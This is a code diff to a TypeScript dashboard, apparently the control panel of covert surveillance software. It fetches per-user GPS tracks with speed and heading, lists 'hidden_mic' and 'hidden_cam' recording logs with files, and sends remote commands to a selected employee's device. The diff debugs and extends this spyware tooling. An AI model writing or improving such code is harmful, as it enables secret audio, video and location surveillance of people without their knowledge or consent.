@@ -12,8 +12,11 @@ interface LocationLog {
     latitude: number;
     longitude: number;
     timestamp: string;
+    created: string;
     user_id: string;
-    expand?: { user_id?: { id: string; email: string } };
+    type?: string;
+    speed?: number;
+    heading?: number;
 }
 
 interface MonitoringLog {
@@ -21,7 +24,7 @@ interface MonitoringLog {
     type: 'hidden_mic' | 'hidden_cam';
     created: string;
     user_id: string;
-    expand?: { user_id?: { id: string; email: string } };
+    file?: string;
 }
 
 interface User {
@@ -86,14 +89,12 @@ export default function Dashboard() {
             console.log('Users fetched:', userList.length, userList);
             setUsers(userList as unknown as User[]);
 
-            // Fetch Data
-            const locs = await pb.collection('locations').getList(1, 20, {
-                // sort: '-timestamp', // Removed due to 400 error on this collection
-                expand: 'user_id'
+            // Fetch Data (user_id is plain text, not a relation — no expand needed)
+            const locs = await pb.collection('locations').getList(1, 50, {
+                sort: '-created',
             });
-            const logsRes = await pb.collection('monitoring_logs').getList(1, 20, {
-                // sort: '-created', // Removed due to 400 error on this collection
-                expand: 'user_id'
+            const logsRes = await pb.collection('monitoring_logs').getList(1, 50, {
+                sort: '-created',
             });
 
             setLocations(locs.items as unknown as LocationLog[]);
@@ -109,24 +110,31 @@ export default function Dashboard() {
     };
 
     const sendCommand = async (type: string) => {
+        if (!selectedUser) {
+            alert('Please select an employee first!');
+            return;
+        }
         try {
-            await pb.collection('commands').create({
+            console.log(`Sending command: ${type} to user: ${selectedUser}`);
+            const result = await pb.collection('commands').create({
                 type,
                 target_user_id: selectedUser,
                 status: 'pending'
             });
-            alert(`Command ${type} sent to selected user!`);
-        } catch (err) {
-            alert('Failed to send command');
+            console.log('Command created:', result);
+            alert(`Command ${type} sent successfully! (ID: ${result.id})`);
+        } catch (err: any) {
+            console.error('Failed to send command:', err);
+            alert(`Failed to send command: ${err?.message || err}`);
         }
     };
 
     const filteredLocations = locations
-        .filter(l => l.user_id === selectedUser || (l.expand?.user_id?.id === selectedUser))
-        .sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
+        .filter(l => l.user_id === selectedUser)
+        .sort((a, b) => new Date(b.created || b.timestamp).getTime() - new Date(a.created || a.timestamp).getTime());
 
     const filteredLogs = logs
-        .filter(l => l.user_id === selectedUser || (l.expand?.user_id?.id === selectedUser))
+        .filter(l => l.user_id === selectedUser)
         .sort((a, b) => new Date(b.created).getTime() - new Date(a.created).getTime());
 
     return (
